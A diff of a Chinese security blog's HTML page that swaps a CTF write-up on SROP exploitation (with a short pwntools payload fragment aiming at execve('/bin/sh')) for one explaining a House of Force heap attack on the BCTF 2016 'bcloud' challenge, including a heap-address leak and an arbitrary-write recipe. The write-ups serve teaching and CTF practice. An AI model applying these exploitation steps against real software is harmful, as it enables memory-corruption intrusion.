@@ -46,7 +46,7 @@
     
     <title>
         
-            srop实战 | 
+            Attack Top Chunk之 bcloud | 
         
         穷则变，变则通，通则久
     </title>
@@ -58,7 +58,7 @@
     <meta name="theme-color" content="#0097A7">
     <meta name="author" content="hac425">
     <meta name="description" itemprop="description" content="">
-    <meta name="keywords" content=",srop,rop">
+    <meta name="keywords" content=",house of force">
 
     <!-- Import lsloader -->
     <script>(function(){window.lsloader={jsRunSequence:[],jsnamemap:{},cssnamemap:{}};lsloader.removeLS=function(key){try{localStorage.removeItem(key)}catch(e){}};lsloader.setLS=function(key,val){try{localStorage.setItem(key,val)}catch(e){}};lsloader.getLS=function(key){var val="";try{val=localStorage.getItem(key)}catch(e){val=""}return val};versionString="/*"+(window.materialVersion||"unknownVersion")+"*/";lsloader.clean=function(){try{var keys=[];for(var i=0;i<localStorage.length;i++){keys.push(localStorage.key(i))}keys.forEach(function(key){var data=lsloader.getLS(key);if(window.oldVersion){var remove=window.oldVersion.reduce(function(p,c){return p||data.indexOf("/*"+c+"*/")!==-1},false);if(remove){lsloader.removeLS(key)}}})}catch(e){}};lsloader.clean();lsloader.load=function(jsname,jspath,cssonload,isJs){if(typeof cssonload==="boolean"){isJs=cssonload;cssonload=undefined}isJs=isJs||false;cssonload=cssonload||function(){};var code;code=this.getLS(jsname);if(code&&code.indexOf(versionString)===-1){this.removeLS(jsname);this.requestResource(jsname,jspath,cssonload,isJs);return}if(code){var versionNumber=code.split(versionString)[0];if(versionNumber!=jspath){console.log("reload:"+jspath);this.removeLS(jsname);this.requestResource(jsname,jspath,cssonload,isJs);return}code=code.split(versionString)[1];if(isJs){this.jsRunSequence.push({name:jsname,code:code});this.runjs(jspath,jsname,code)}else{document.getElementById(jsname).appendChild(document.createTextNode(code));cssonload()}}else{this.requestResource(jsname,jspath,cssonload,isJs)}};lsloader.requestResource=function(name,path,cssonload,isJs){var that=this;if(isJs){this.iojs(path,name,function(path,name,code){that.setLS(name,path+versionString+code);that.runjs(path,name,code)})}else{this.iocss(path,name,function(code){document.getElementById(name).appendChild(document.createTextNode(code));that.setLS(name,path+versionString+code)},cssonload)}};lsloader.iojs=function(path,jsname,callback){var that=this;that.jsRunSequence.push({name:jsname,code:""});try{var xhr=new XMLHttpRequest;xhr.open("get",path,true);xhr.onreadystatechange=function(){if(xhr.readyState==4){if(xhr.status>=200&&xhr.status<300||xhr.status==304){if(xhr.response!=""){callback(path,jsname,xhr.response);return}}that.jsfallback(path,jsname)}};xhr.send(null)}catch(e){that.jsfallback(path,jsname)}};lsloader.iocss=function(path,jsname,callback,cssonload){var that=this;try{var xhr=new XMLHttpRequest;xhr.open("get",path,true);xhr.onreadystatechange=function(){if(xhr.readyState==4){if(xhr.status>=200&&xhr.status<300||xhr.status==304){if(xhr.response!=""){callback(xhr.response);cssonload();return}}that.cssfallback(path,jsname,cssonload)}};xhr.send(null)}catch(e){that.cssfallback(path,jsname,cssonload)}};lsloader.iofonts=function(path,jsname,callback,cssonload){var that=this;try{var xhr=new XMLHttpRequest;xhr.open("get",path,true);xhr.onreadystatechange=function(){if(xhr.readyState==4){if(xhr.status>=200&&xhr.status<300||xhr.status==304){if(xhr.response!=""){callback(xhr.response);cssonload();return}}that.cssfallback(path,jsname,cssonload)}};xhr.send(null)}catch(e){that.cssfallback(path,jsname,cssonload)}};lsloader.runjs=function(path,name,code){if(!!name&&!!code){for(var k in this.jsRunSequence){if(this.jsRunSequence[k].name==name){this.jsRunSequence[k].code=code}}}if(!!this.jsRunSequence[0]&&!!this.jsRunSequence[0].code&&this.jsRunSequence[0].status!="failed"){var script=document.createElement("script");script.appendChild(document.createTextNode(this.jsRunSequence[0].code));script.type="text/javascript";document.getElementsByTagName("head")[0].appendChild(script);this.jsRunSequence.shift();if(this.jsRunSequence.length>0){this.runjs()}}else if(!!this.jsRunSequence[0]&&this.jsRunSequence[0].status=="failed"){var that=this;var script=document.createElement("script");script.src=this.jsRunSequence[0].path;script.type="text/javascript";this.jsRunSequence[0].status="loading";script.onload=function(){that.jsRunSequence.shift();if(that.jsRunSequence.length>0){that.runjs()}};document.body.appendChild(script)}};lsloader.tagLoad=function(path,name){this.jsRunSequence.push({name:name,code:"",path:path,status:"failed"});this.runjs()};lsloader.jsfallback=function(path,name){if(!!this.jsnamemap[name]){return}else{this.jsnamemap[name]=name}for(var k in this.jsRunSequence){if(this.jsRunSequence[k].name==name){this.jsRunSequence[k].code="";this.jsRunSequence[k].status="failed";this.jsRunSequence[k].path=path}}this.runjs()};lsloader.cssfallback=function(path,name,cssonload){if(!!this.cssnamemap[name]){return}else{this.cssnamemap[name]=1}var link=document.createElement("link");link.type="text/css";link.href=path;link.rel="stylesheet";link.onload=link.onerror=cssonload;var root=document.getElementsByTagName("script")[0];root.parentNode.insertBefore(link,root)};lsloader.runInlineScript=function(scriptId,codeId){var code=document.getElementById(codeId).innerText;this.jsRunSequence.push({name:scriptId,code:code});this.runjs()};lsloader.loadCombo=function(jslist){var updateList="";var requestingModules={};for(var k in jslist){var LS=this.getLS(jslist[k].name);if(!!LS){var version=LS.split(versionString)[0];var code=LS.split(versionString)[1]}else{var version=""}if(version==jslist[k].path){this.jsRunSequence.push({name:jslist[k].name,code:code,path:jslist[k].path})}else{this.jsRunSequence.push({name:jslist[k].name,code:null,path:jslist[k].path,status:"comboloading"});requestingModules[jslist[k].name]=true;updateList+=(updateList==""?"":";")+jslist[k].path}}var that=this;if(!!updateList){var xhr=new XMLHttpRequest;xhr.open("get",combo+updateList,true);xhr.onreadystatechange=function(){if(xhr.readyState==4){if(xhr.status>=200&&xhr.status<300||xhr.status==304){if(xhr.response!=""){that.runCombo(xhr.response,requestingModules);return}}else{for(var i in that.jsRunSequence){if(requestingModules[that.jsRunSequence[i].name]){that.jsRunSequence[i].status="failed"}}that.runjs()}}};xhr.send(null)}this.runjs()};lsloader.runCombo=function(comboCode,requestingModules){comboCode=comboCode.split("/*combojs*/");comboCode.shift();for(var k in this.jsRunSequence){if(!!requestingModules[this.jsRunSequence[k].name]&&!!comboCode[0]){this.jsRunSequence[k].status="comboJS";this.jsRunSequence[k].code=comboCode[0];this.setLS(this.jsRunSequence[k].name,this.jsRunSequence[k].path+versionString+comboCode[0]);comboCode.shift()}}this.runjs()}})();</script>
@@ -240,18 +240,18 @@
     <!-- The Open Graph protocol -->
     <meta property="og:url" content="http://blog.hac425.top">
     <meta property="og:type" content="blog">
-    <meta property="og:title" content="srop实战 | 穷则变，变则通，通则久">
+    <meta property="og:title" content="Attack Top Chunk之 bcloud | 穷则变，变则通，通则久">
     <meta property="og:image" content="http://blog.hac425.top/img/girl.png" />
     <meta property="og:description" content="">
-    <meta property="og:article:tag" content="srop"> <meta property="og:article:tag" content="rop"> 
+    <meta property="og:article:tag" content="house of force"> 
 
     
-        <meta property="article:published_time" content="Sat Dec 16 2017 17:36:00 GMT+0800" />
-        <meta property="article:modified_time" content="Sat Dec 16 2017 18:20:37 GMT+0800" />
+        <meta property="article:published_time" content="Wed Mar 21 2018 16:44:00 GMT+0800" />
+        <meta property="article:modified_time" content="Wed Mar 21 2018 19:00:25 GMT+0800" />
     
 
     <!-- The Twitter Card protocol -->
-    <meta name="twitter:title" content="srop实战 | 穷则变，变则通，通则久">
+    <meta name="twitter:title" content="Attack Top Chunk之 bcloud | 穷则变，变则通，通则久">
     <meta name="twitter:description" content="">
     <meta name="twitter:image" content="http://blog.hac425.top/img/girl.png">
     <meta name="twitter:card" content="summary_large_image" />
@@ -259,7 +259,7 @@
 
     <!-- Add canonical link for SEO -->
     
-        <link rel="canonical" href="http://blog.hac425.top/2017/12/16/pwn_with_srop.html" />
+        <link rel="canonical" href="http://blog.hac425.top/2018/03/21/tack_top_chunk_bcloud.html" />
     
 
     <!-- Structured-data for SEO -->
@@ -271,10 +271,10 @@
 {
     "@context": "https://schema.org",
     "@type": "BlogPosting",
-    "mainEntityOfPage": "http://blog.hac425.top/2017/12/16/pwn_with_srop.html",
-    "headline": "srop实战",
-    "datePublished": "Sat Dec 16 2017 17:36:00 GMT+0800",
-    "dateModified": "Sat Dec 16 2017 18:20:37 GMT+0800",
+    "mainEntityOfPage": "http://blog.hac425.top/2018/03/21/tack_top_chunk_bcloud.html",
+    "headline": "Attack Top Chunk之 bcloud",
+    "datePublished": "Wed Mar 21 2018 16:44:00 GMT+0800",
+    "dateModified": "Wed Mar 21 2018 19:00:25 GMT+0800",
     "author": {
         "@type": "Person",
         "name": "hac425",
@@ -292,7 +292,7 @@
             "url": "/img/girl.png"
         }
     },
-    "keywords": ",srop,rop",
+    "keywords": ",house of force",
     "description": "",
 }
 </script>
@@ -367,7 +367,7 @@
     </button>
 
     <ul class="post-toc-wrap mdl-menu mdl-menu--bottom-left mdl-js-menu mdl-js-ripple-effect" for="post-toc-trigger-btn" style="max-height:80vh; overflow-y:scroll;">
-        <ol class="post-toc"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#前言"><span class="post-toc-number">1.</span> <span class="post-toc-text">前言</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#正文"><span class="post-toc-number">2.</span> <span class="post-toc-text">正文</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#最后"><span class="post-toc-number">3.</span> <span class="post-toc-text">最后</span></a></li></ol>
+        <ol class="post-toc"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#前言"><span class="post-toc-number">1.</span> <span class="post-toc-text">前言</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#正文"><span class="post-toc-number">2.</span> <span class="post-toc-text">正文</span></a></li></ol>
     </ul>
     
 
@@ -399,7 +399,7 @@
         
     
             <p class="article-headline-p">
-                srop实战
+                Attack Top Chunk之 bcloud
             </p>
         </div>
 
@@ -418,7 +418,7 @@
     <!-- Author Name & Date -->
     <div>
         <strong>hac425</strong>
-        <span>12月 16, 2017</span>
+        <span>3月 21, 2018</span>
     </div>
 
     <div class="section-spacer"></div>
@@ -440,7 +440,7 @@
 <ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-functions-qrcode-button">
     <li class="mdl-menu__item">在其它设备中阅读本文章</li>
     
-        <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACZ0lEQVR42u3ay27CQAwFUP7/p9ttpYpw77wI6GRVhUDmzGLs2n78fPX1wMPDw8PDw8PDuxnvEV9Pf+7Pp8+ef/bM//vza8PDw8M7w3tx1AYvThaUvPcaHK0NDw8P7yAvObKvl95+KwkhdTjBw8PDuyVvbClJmFmQiOPh4eHdnpckx8kdPDw8vE/k5YXaZ7z80+Ttb6i14OHh4cW8vMl0/u+j/T08PDy8gFePNE0XHdrC7tTQFR4eHt4G3u7G/9qmVzQEhoeHh3eQlxz38wNSY4GkKHDg4eHhbeZdH8F5sXVsKXlTrVgPHh4e3nHeghZUTLre0AWjA3h4eHgbeHmxIG+GtaMA+ZBBtHF4eHh4N+DlZYh8+GCsWBwl33h4eHibeWPFiHoQaihZXxAY8PDw8DbwroPBfHo9VoxIQk4xOoCHh4d3hLe4KTVd8ihCDh4eHt5mXlsgaBPftmDRtsHw8PDwzvOiJHXDIvJwUgchPDw8vM28/Efb1tRYGGgLx3h4eHjv4s03+GeaYXnAiL6Lh4eHt5nXJrXXvLZ5lrTH2tCFh4eHd56XkJIn26CSB6QipcbDw8M7whs71q+LC2PjCMlgAR4eHt57ee0gVPJMsaz4erEReHh4eJt57bV2IGCs5VbPlOHh4eEt5bXH8VjzrB0vSJ4vUmo8PDy8Dby8kZ+XIWY2ZXFgwMPDw9vGmznQ89JGGyTaNhgeHh7enXl52WKsNNyC8fDw8D6FN5YWt8MKxT8AeHh4eAd5+YuTANBuTb7pG8u4eHh4eBsaYPP3k1Q7v4+Hh4d3nvd9Fx4eHh4eHh4e3g2uXxjSFhH8aJbSAAAAAElFTkSuQmCC">
+        <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACbUlEQVR42u3aQXLjMAwEQP//05vrVm1FngElmsm2Tq6YFtk8EAyA159f/bzw8PDw8PDw8PAO473i5+/x15//ff+bBV3+Nl8bHh4e3k5ePn1Cyt+wMvK7MXh4eHg7eW0wyI/15NBPtvJ6PB4eHt6ZvGTp1yOvZ8HDw8P7fbw8YdEe98n1Gg8PD+803kqaNQkh7eX7A7kWPDw8vJh3bwHs3s/H1ffw8PD+e97sSS67+QU6CR7F2vDw8PAe5iWTJYCkIWCW9q03FA8PD28jL0+q5ktsA0PytjdbiYeHh/cwrw0Pd/12JfwUBTA8PDy8Lbz1BeWFsTa0RIEEDw8P72HeesNTXjBrL+6z9+Dh4eE9zWuTpyuFsSQY5OA6GYGHh4d3E2+lfLVyxM8u3Hh4eHgn8IaviNtYZ0FoNi8eHh7eHl7+D3/bmr++cbM2Vjw8PLydvFkitS1iJcWtfBOH3bh4eHh4C7x2ce3EbdNq8hc8PDy8z/Jmqdh2yjyQJNtUN13h4eHh3cpLkqRt+SoPMHmIKrYbDw8P72HeMFU6ayQdlb7q5i08PDy8Lbzk0jxLtq5cmmeFMTw8PLxP8dpDPElD5EufpUXw8PDwdvKSklWevMjLV23SNmrbwsPDw3uYN0uqtsmIlnpbYMDDw8N7gNcex+uJibyBtb3u4+Hh4e3krRTv8+3IC13JGvDw8PBO4M2WmKQY8oaAtiSGh4eH97N4bUgoGqfKTcHDw8M7mbfSEJAf8bPkBR4eHt5+XntMtyPXv10KDHh4eHi38toC2CxxkF+4k3TGg60DeHh4eLc2XZ3/4OHh4eHh4eHhHfB8AV0ict7gl87AAAAAAElFTkSuQmCC">
     
 </ul>
 
@@ -454,7 +454,7 @@
     </button>
     <ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-functions-viewtags-button">
         <li class="mdl-menu__item">
-        <a class="post_tag-link" href="/tags/rop/">rop</a></li><li class="mdl-menu__item"><a class="post_tag-link" href="/tags/srop/">srop</a>
+        <a class="post_tag-link" href="/tags/house-of-force/">house of force</a>
     </ul>
     
 
@@ -481,7 +481,7 @@
 
     <!-- Share Weibo -->
     
-        <a class="post_share-link" href="http://service.weibo.com/share/share.php?appkey=&title=srop实战&url=http://blog.hac425.top/2017/12/16/pwn_with_srop.html&pic=http://blog.hac425.top/img/girl.png&searchPic=false&style=simple" target="_blank">
+        <a class="post_share-link" href="http://service.weibo.com/share/share.php?appkey=&title=Attack Top Chunk之 bcloud&url=http://blog.hac425.top/2018/03/21/tack_top_chunk_bcloud.html&pic=http://blog.hac425.top/img/girl.png&searchPic=false&style=simple" target="_blank">
             <li class="mdl-menu__item">
                 分享到微博
             </li>
@@ -490,7 +490,7 @@
 
     <!-- Share Twitter -->
     
-        <a class="post_share-link" href="https://twitter.com/intent/tweet?text=srop实战&url=http://blog.hac425.top/2017/12/16/pwn_with_srop.html&via=hac425" target="_blank">
+        <a class="post_share-link" href="https://twitter.com/intent/tweet?text=Attack Top Chunk之 bcloud&url=http://blog.hac425.top/2018/03/21/tack_top_chunk_bcloud.html&via=hac425" target="_blank">
             <li class="mdl-menu__item">
                 分享到 Twitter
             </li>
@@ -499,7 +499,7 @@
 
     <!-- Share Facebook -->
     
-        <a class="post_share-link" href="https://www.facebook.com/sharer/sharer.php?u=http://blog.hac425.top/2017/12/16/pwn_with_srop.html" target="_blank">
+        <a class="post_share-link" href="https://www.facebook.com/sharer/sharer.php?u=http://blog.hac425.top/2018/03/21/tack_top_chunk_bcloud.html" target="_blank">
             <li class="mdl-menu__item">
                 分享到 Facebook
             </li>
@@ -508,7 +508,7 @@
 
     <!-- Share Google+ -->
     
-        <a class="post_share-link" href="https://plus.google.com/share?url=http://blog.hac425.top/2017/12/16/pwn_with_srop.html" target="_blank">
+        <a class="post_share-link" href="https://plus.google.com/share?url=http://blog.hac425.top/2018/03/21/tack_top_chunk_bcloud.html" target="_blank">
             <li class="mdl-menu__item">
                 分享到 Google+
             </li>
@@ -532,34 +532,71 @@
                 <!-- Post Content -->
                 <div id="post-content" class="mdl-color-text--grey-700 mdl-card__supporting-text fade out">
     
-        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p><code>srop</code> 的作用比较强，在条件允许的情况下，尽量使用它。题目来自于 <code>i春秋</code>的一个比赛。</p>
-<p>题目链接：<br><a href="https://gitee.com/hac425/blog_data/blob/master/smallest" target="_blank" rel="external">https://gitee.com/hac425/blog_data/blob/master/smallest</a></p>
-<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>程序非常的简单</p>
-<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513417180656goqrxx0p.png?imageslim" alt="paste image"><br>使用 <code>syscall</code> 进行系统调用，往 <code>rsp</code> 读入数据，然后 <code>ret</code>, 直接就可以控制 <code>rip</code>. </p>
-<p>程序非常的小，除了 这里基本没有代码，但是我们有 <code>syscall</code> ，<code>srop</code>利用之。首先明确目标。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">execve(“/bin/sh”, 0, 0)</div></pre></td></tr></table></figure>
-<p><code>syscall</code> 的传参顺序为 </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">rdi,rsi,rdx,rcx,r8, r9</div></pre></td></tr></table></figure>
-<p>然后 <code>rax</code> 存放 系统调用号 以及 <code>syscall</code> 的返回值。<br>所以我们需要设置 </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">rax=59</div><div class="line">rdi---&gt; /bin/sh</div><div class="line">rsi=0</div><div class="line">rdx=0</div></pre></td></tr></table></figure>
-<p>然后 <code>syscall</code>.就可以拿到 <code>shell</code> 了。</p>
-<p>使用 <code>srop</code> 我们可以控制所有的寄存器的值。<br>所以我们需要一个可写的地址在一次<code>srop</code>结束后设置为 <code>rsp</code>.</p>
-<p><strong>下面根据 <code>exp</code> 进行讲解</strong></p>
-<p>首先是通过栈中环境变量，泄露栈的地址，得到一个可写的地址，用于 <code>srop</code> 时设置 <code>rsp</code>.</p>
-<p>因为 <code>write</code> 的系统调用号 为 <code>1</code>,  而且 <code>stdout</code> 也为 <code>1</code>, 这样我们输入一个字符。然后通过 <code>rop</code> 跳到</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mov     rdi, rax        ; fd</div><div class="line">syscall</div></pre></td></tr></table></figure>
-<p>我们就能 调用 <code>write(1,rsi,rdx)</code>, 此时的 <code>rsi</code> 就是栈的地址，<code>rdx</code> 则为 <code>0x400</code>,我们就能 拿到 栈的地址。</p>
-<p>有一点需要注意的是，我们需要事先布置好栈数据，然后再次进入 <code>start</code>, 控制 <code>rax</code>.因为我们要控制的 <code>rax</code> 值小于 我们需要布置的数据的长度。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">again = 0x4000B0         #xor     rax, rax</div><div class="line">rdi_rsi_sys = 0x04000BB  # mov     rdi, rax</div><div class="line"></div><div class="line">payload = p64(again)</div><div class="line">payload += p64(rdi_rsi_sys)</div><div class="line">payload += p64(again)  # addr for after leak</div><div class="line"></div><div class="line">p.send(payload)</div><div class="line">sleep(0.2)</div><div class="line"></div><div class="line">log.info(&quot;set stack for call write(1,....)&quot;)</div><div class="line"># pause()</div><div class="line"></div><div class="line">p.send(&apos;\xbb&apos;)</div><div class="line">data = p.recv()</div><div class="line">sleep(0.2)</div><div class="line"></div><div class="line">stack_addr = u64(data[0x10:0x18]) - 0x253</div><div class="line">log.info(hex(stack_addr))</div><div class="line"></div><div class="line">log.info(&quot;set rax=1, and ret to rdi_rsi_sys to call write(1,....)&quot;)</div></pre></td></tr></table></figure>
-<p>然后就是 <code>srop</code> 了。首先使用 <code>srop</code> 修改 <code>rsp</code>到 我们 一个刚刚泄露的地址.设置好 <code>/bin/sh</code>, 这么做的原因是，在一个确定地址处设置好 <code>/bin/sh</code>，用于后面 <code>getshell</code>.</p>
-<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15134185188140sj1uelb.png?imageslim" alt="paste image"></p>
-<p>然后又回到开头，设置 <code>SigreturnFrame</code>, 此时已经可以确定<code>/bin/sh</code> 的地址了。设置好 寄存器。<code>srop</code>之后，再次 <code>syscall</code> 执行<br><code>execve(“/bin/sh”, 0, 0)</code></p>
-<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15134185607335pktg6kj.png?imageslim" alt="paste image"></p>
-<h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>很多东西调试一遍就清楚了。调试 <code>exp</code>, 写一点就调试一点。<code>srop</code> 时 ,栈顶开始为 <code>SigreturnFrame</code>.</p>
+        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>这是 <code>bctf 2016</code> 的题，链接</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://github.com/ctfs/write-ups-2016/tree/master/bctf-2016/exploit/bcloud-200</div></pre></td></tr></table></figure>
+<p>相关资源</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://gitee.com/hac425/blog_data/tree/master/bcloud</div></pre></td></tr></table></figure>
+<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>首先程序开启的保护</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">haclh@ubuntu:~/workplace/bcloud$ checksec bcloud </div><div class="line">[*] &apos;/home/haclh/workplace/bcloud/bcloud&apos;</div><div class="line">    Arch:     i386-32-little</div><div class="line">    RELRO:    Partial RELRO</div><div class="line">    Stack:    Canary found</div><div class="line">    NX:       NX enabled</div><div class="line">    PIE:      No PIE</div></pre></td></tr></table></figure>
+<p><code>Partial RELRO</code> 可以改 <code>got</code></p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1521622207019101o3q3g.png?imageslim" alt="paste image"></p>
+<p>在  <code>init_some</code> 里面藏着两个非常隐蔽的漏洞。进去看看，首先调用 <code>get_username</code> 获取一个 <code>name</code></p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1521624966718c1ikvsn6.png?imageslim" alt="paste image"></p>
+<p>首先使用 <code>read_to_buf</code> 获取 <code>name</code>, 最大大小为 <code>0x40</code>, 然后 <code>malloc</code> 一块内存用于存放 <code>name</code>,</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1521625165707yt4j87yx.png?imageslim" alt="paste image"></p>
+<p>如果我们输入 <code>0x40</code> 个字符， 那么 <code>name[0x41] = \x00</code>, 回到 <code>get_username</code> ，我们发现 <code>name</code> 和 <code>ptr</code> 是相邻的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">char name; // [esp+1Ch] [ebp-5Ch]</div><div class="line">char *ptr; // [esp+5Ch] [ebp-1Ch]</div></pre></td></tr></table></figure>
+<p>那么 <code>name[0x41]</code> 其实就是 <code>ptr</code> 最低字节（小端模式下）， 在 <code>read_to_buf</code> 之后才通过  <code>malloc</code> 把分配的指针存在了 <code>ptr</code>， 所以 <code>ptr</code> 会覆盖掉 <code>read_to_buf</code> 中为字符串设置的 <code>\x00</code> 终结符（<code>name[0x41] = \x00</code>）， 接着又用了 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">strcpy(ptr, &amp;name);</div></pre></td></tr></table></figure>
+<p>来拷贝字符串，这就会把 <code>ptr</code> 的值也拷贝进  <code>ptr</code> 指向的堆内存（溢出）。拷贝完后，紧接着会调用 <code>printf</code> 打印 <code>ptr</code> 所指向的字符串，我们就可以泄露 <strong>堆地址</strong></p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15216260299675e5beuet.png?imageslim" alt="paste image"></p>
+<p>调试验证一下， 输入 <code>0x40</code> 个 <code>a</code>, 然后在调用 <code>strcpy</code> 处下个断点。</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/152162583030734pfkx6f.png?imageslim" alt="paste image"></p>
+<p>可以看到， <code>name</code> 字符串的终结符 <code>\x00</code> 已经被 新分配的内存地址 <code>0x0804c008</code> 给吃掉了，调用 <code>strcpy</code> 就会把 <code>ptr</code> 的值一起拷贝进 新分配的内存 <code>0x0804c008</code> , 接下来的 <code>printf</code> 就会打印出这个地址，这样就能拿到  <strong>堆地址</strong> 了。</p>
+<p>回到 <code>init_some</code> 函数，接下来会调用 <code>set_host_org</code></p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15216261307266jplzaq3.png?imageslim" alt="paste image"></p>
+<p>和  <code>get_username</code> 一样的漏洞</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">char org_; // [esp+1Ch] [ebp-9Ch]</div><div class="line">char *org_ptr; // [esp+5Ch] [ebp-5Ch]</div><div class="line">int host_; // [esp+60h] [ebp-58h]</div><div class="line">char *host_ptr; // [esp+A4h] [ebp-14h]</div></pre></td></tr></table></figure>
+<p>首先分配读入 <code>org_</code>  和 <code>host_</code> ,然后分配 <code>host_ptr</code> 和 <code>org_ptr</code>, 其中 <code>org_</code> 和 <code>org_ptr</code> 是相邻的 ，而 <code>org_ptr</code> 和 <code>host_</code> 是相邻的，所以当输入 <code>0x40</code> 字节的  <code>org_</code> 然后 到了最后的 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">strcpy(org_ptr, &amp;org_);</div></pre></td></tr></table></figure>
+<p>就会 把 <code>org_</code>  , <code>org_ptr</code> 和 <code>host_</code> 一起拷贝到  <code>org_ptr</code> 所指向的内存.</p>
+<p>由于 <code>org_ptr</code> 是后面 <code>malloc</code> 的，所以 <code>org_ptr</code> 和 <code>top chunk</code> 相邻，于是我们就可以溢出 <code>top chunk</code>, <code>org_ptr</code> 的值会在 <code>top chunk</code> 的 <code>pre_size</code> 为， 而 <code>top chunk</code> 的 <code>size</code> 位则为 <code>host_</code> 的开始 4 个字节。所以我们现在可以任意修改 <code>top chunk</code> 的 <code>size</code> 位。</p>
+<p>然后在 <code>new_note</code> 里面，我们可以控制分配的大小，而且我们可以 分配最多 <code>10</code> 个 <code>note</code></p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1521627668679zva8p7ow.png?imageslim" alt="paste image"></p>
+<p>所以我们现在的能力</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">可以修改top chunk的 size</div><div class="line">可以控制 malloc 的参数</div><div class="line">可以malloc的次数 &gt;= 2</div></pre></td></tr></table></figure>
+<p><code>house of force</code> 搞起来，通过 <code>house of force</code>  我们可以 <code>malloc</code> 到任意地址。</p>
+<p>先覆盖 <code>top chunk</code> 的 <code>size</code> 为 <code>0xffffffff</code>, 然后使用计算公式 ( 32 位）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">evil_size = target_addr - 2 * 0x4 - top_chunk_addr</div></pre></td></tr></table></figure>
+<p>然后在 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">malloc(evil_size)</div><div class="line">ptr = malloc(size)</div></pre></td></tr></table></figure>
+<p>那么 <code>ptr</code> 就是 <code>target_addr +  2 * 0x4</code> 了( <code>pre_size + size = 2 * 4</code> )。</p>
+<p>再配合程序的 <code>edit_note</code> 就可以实现 任意地址写。</p>
+<p>任意地址写的实现如下</p>
+<p>首先使用 <code>house of force</code>, 使得 <code>note1</code> 指向 <code>note_ptr_table</code> </p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1521628926044vxt45mpr.png?imageslim" alt="paste image"></p>
+<p>接着操作 <code>note1</code>, 就是编辑 <code>note_ptr_table</code> 。同时每次对 <code>note_ptr_table</code> 的操作都要记得 <code>note_ptr_table[1] = note_ptr_table</code>, 这样可以维持编辑 <code>note_ptr_table</code> 的能力，同时在后面可以重用这部分代码来 进行 内存 写。</p>
+<p>由于  <code>note0</code> 的 <code>size=evil_size</code> ，其实这是个负数，测试时对 <code>note0</code> 进行 <code>edit</code> 有一两个字节写不进去，于是，多分配一个 <code>note2</code>, 用它来作为 <strong> 任意地址写</strong> 的载体。</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1521629161488oiza1b02.png?imageslim" alt="paste image"></p>
+<p>任意地址写的代码片段如下，（懒的抽出来重写一个函数了</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1521629275918h6hwbbp2.png?imageslim" alt="paste image"></p>
